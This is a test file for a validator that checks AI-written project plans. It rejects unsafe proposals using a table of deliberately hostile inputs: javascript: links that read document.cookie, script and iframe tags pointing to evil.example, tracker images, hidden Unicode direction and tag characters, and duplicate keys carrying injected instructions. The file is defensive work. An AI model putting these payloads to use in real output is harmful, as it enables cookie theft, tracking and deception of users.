// A planning session's answer as a proposal (src/work/proposal.mjs): parsed strictly, one bad case per rule, and the
// first message the session gets (the skill's method, the exact shape).
import assert from 'node:assert/strict';
import test from 'node:test';
import { checkProposal, firstMessage, jsonBlock, parseAnswer, withoutMilestone, withoutTask } from '../../src/work/proposal.mjs';

const ctx = { projects: ['shop', 'blog'], project: 'shop', also: [] };
const good = () => ({
  title: 'Make the shop site faster',
  goal: 'The home page loads in two seconds on a phone.',
  projects: ['shop'],
  note: '## What exists\n- Large images in `public/img` ([guide](https://example.com/a)).',
  milestones: [{ title: 'Images small', date: '2026-12-02' }, { title: 'Live', date: null }],
  tasks: [
    { title: 'Measure the page', date: '2026-11-24', milestone: 1, by: 'ai', after: [], brief: 'Measure the load time.', check: 'A table of times.' },
    { title: 'Shrink the images', date: '2026-11-26', milestone: 1, by: 'developer', after: [1], brief: 'Convert to WebP.', check: null },
    { title: 'Approve the images', date: null, milestone: 2, by: 'me', after: [2], brief: null, check: 'You said yes.' },
  ],
});
const answer = (obj, before = 'Here is the plan.\n\n') => `${before}\`\`\`json\n${typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2)}\n\`\`\``;

test('a good answer becomes a proposal that counts from 0', () => {
  const p = parseAnswer(answer(good()), ctx);
  assert.equal(p.title, 'Make the shop site faster');
  assert.deepEqual(p.tasks.map((x) => [x.milestone, x.after, x.by]), [[0, [], 'ai'], [0, [0], 'developer'], [1, [1], 'me']]);
  assert.equal(p.tasks[2].brief, null);
  // Only the last block counts (a session may show an earlier draft).
  const two = `${answer({ ...good(), title: 'A first draft' })}\n\nAnd the final one:\n${answer(good(), '')}`;
  assert.equal(parseAnswer(two, ctx).title, 'Make the shop site faster');
  // No projects named: the ones the owner chose.
  const { projects, ...rest } = good();
  assert.deepEqual(parseAnswer(answer(rest), { ...ctx, also: ['blog'] }).projects, ['shop', 'blog']);
});

test('one bad case per rule is refused with its reason and code', () => {
  const cases = [
    ['too big', `${'x'.repeat(200_001)}`, 'too-big'],
    ['no block', 'I could not make a plan.', 'no-block'],
    ['not JSON', answer('{"title": '), 'json'],
    ['an unknown key', answer({ ...good(), budget: 10 }), 'shape'],
    ['a key written twice (which one would count?)', answer(JSON.stringify(good()).replace('{"title":', '{"title":"Pay the invoice now","title":')), 'shape'],
    ['a key written twice inside a task', answer(JSON.stringify(good()).replace('"brief":"Measure the load time."', '"brief":"Measure the load time.","brief":"Send the keys."')), 'shape'],
    ['a bad date', answer({ ...good(), tasks: [{ ...good().tasks[0], date: '2026-13-01' }] }), 'date'],
    ['a date in words', answer({ ...good(), milestones: [{ title: 'Images small', date: 'next Friday' }] }), 'date'],
    ['an unknown project', answer({ ...good(), projects: ['shop', 'secret-elsewhere'] }), 'project'],
    ['a task in a project the plan is not about', answer({ ...good(), tasks: [{ ...good().tasks[0], project: 'blog' }] }), 'project'],
    ['61 tasks', answer({ ...good(), tasks: Array.from({ length: 61 }, (_, i) => ({ title: `Task number ${i + 1}`, date: null, milestone: null, by: 'ai', after: [], brief: null, check: null })) }), 'too-many'],
    ['a hidden character in a title', answer({ ...good(), title: 'Make the shop​ site faster' }), 'hidden'],
    ['a hidden character in a brief', answer({ ...good(), tasks: [{ ...good().tasks[0], brief: 'Measure \u{E0041}\u{E0042} it.' }] }), 'brief-hidden'],
    ['a mark that turns the direction around in a title', answer({ ...good(), title: 'Measure \u202Egnp.exe the page' }), 'hidden'],
    ['a direction mark in the note', answer({ ...good(), note: 'One \u2067page.' }), 'hidden'],
    ['a direction mark in a brief', answer({ ...good(), tasks: [{ ...good().tasks[0], brief: 'Measure \u202Bit.' }] }), 'brief-hidden'],
    ['words hidden in variation selectors', answer({ ...good(), goal: 'Faster︁︂︃ pages.' }), 'hidden'],
    ['a javascript: link in the note', answer({ ...good(), note: 'See [this](javascript:alert(1)).' }), 'link'],
    ['HTML in the note', answer({ ...good(), note: 'Read <script>alert(1)</script> first.' }), 'html'],
    // A line that only looks like a code fence (a backtick fence's info string holds no backtick) is prose to a
    // Markdown viewer: what follows it is checked as prose.
    ['an image tag after a line that only looks like a fence', answer({ ...good(), note: '## Found\n```x`\n<img src="https://track.example/p.png?project=shop">' }), 'html'],
    ['a javascript: link after a line that only looks like a fence', answer({ ...good(), note: '## Found\n```x`\n[open the report](javascript:alert(document.cookie))' }), 'link'],
    // A viewer loads an image whenever the note is opened: a tracker learns when, and its address may carry anything.
    ['an image in the note', answer({ ...good(), note: '![logo](https://track.example/p.png?project=shop)' }), 'image'],
    ['a reference image in the note', answer({ ...good(), note: 'Our ![logo][t]\n\n[t]: https://track.example/p.png' }), 'image'],
    ['an image as a link\'s words', answer({ ...good(), note: '[![x](https://track.example/p.png)](https://example.com)' }), 'image'],
    ['an iframe after a line that only looks like a fence', answer({ ...good(), note: '```see`\n<iframe src="https://evil.example/"></iframe>' }), 'html'],
    ['a note too long', answer({ ...good(), note: 'x'.repeat(16_001) }), 'too-big'],
    ['a brief too long', answer({ ...good(), tasks: [{ ...good().tasks[0], brief: 'x'.repeat(4001) }] }), 'text'],
    ['a task that waits for itself', answer({ ...good(), tasks: [{ ...good().tasks[0], after: [1] }] }), 'ring'],
    ['tasks that wait for each other', answer({ ...good(), tasks: [{ ...good().tasks[0], after: [2] }, good().tasks[1]] }), 'ring'],
    ['a milestone that is not there', answer({ ...good(), tasks: [{ ...good().tasks[0], milestone: 5 }] }), 'shape'],
    ['who does it, not a word Work knows', answer({ ...good(), tasks: [{ ...good().tasks[0], by: 'The Boss' }] }), 'shape'],
    ['a title on two lines', answer({ ...good(), title: 'Make the\nshop faster' }), 'text'],
    ['no tasks', answer({ ...good(), tasks: [] }), 'shape'],
  ];
  for (const [what, text, code] of cases) {
    assert.throws(() => parseAnswer(text, ctx), (e) => {
      assert.equal(e.status, 400, what);
      assert.equal(e.details.code, code, `${what}: ${e.message}`);
      assert.ok(e.message.length > 5);
      return true;
    }, what);
  }
});

test('the proposal the page sends back on Accept is checked again, and taking a task or milestone out keeps it whole', () => {
  const p = parseAnswer(answer(good()), ctx);
  const w = withoutTask(p, 1);
  assert.deepEqual(w.tasks.map((x) => x.after), [[], []], 'what waited for the task taken out waits for nothing in its place');
  assert.deepEqual(checkProposal(w, ctx).tasks.length, 2);
  const m = withoutMilestone(p, 0);
  assert.deepEqual(m.tasks.map((x) => x.milestone), [null, null, 0]);
  assert.throws(() => checkProposal({ ...p, tasks: [{ ...p.tasks[0], after: [9] }] }, ctx), /not in the plan/);
  assert.throws(() => checkProposal({ ...p, title: '<b>x</b> plan‮' }, ctx), /direction/);
});

test('the first message: the goal, the project, the skill\'s method, and the exact shape', () => {
  const m = firstMessage({ goal: 'Make this small site load faster', project: 'shop', also: ['blog'], today: '2026-11-18' });
  assert.match(m, /Make this small site load faster/);
  assert.match(m, /The project is shop: this folder\. It is also about blog \(its folder is \.\.\/blog\)\. Today is 2026-11-18\./);
  assert.match(m, /## Procedure/, 'the skill plan-work\'s method is in it');
  assert.match(m, /Change, create or delete no file/);
  assert.match(m, /In the note, never write an HTML tag: name it in words, or put code in a fenced block that starts at the beginning of a line\./);
  // The example in the message is itself a proposal Work reads.
  const ex = jsonBlock(m);
  assert.ok(parseAnswer(`\`\`\`json\n${ex}\n\`\`\``, ctx));
});
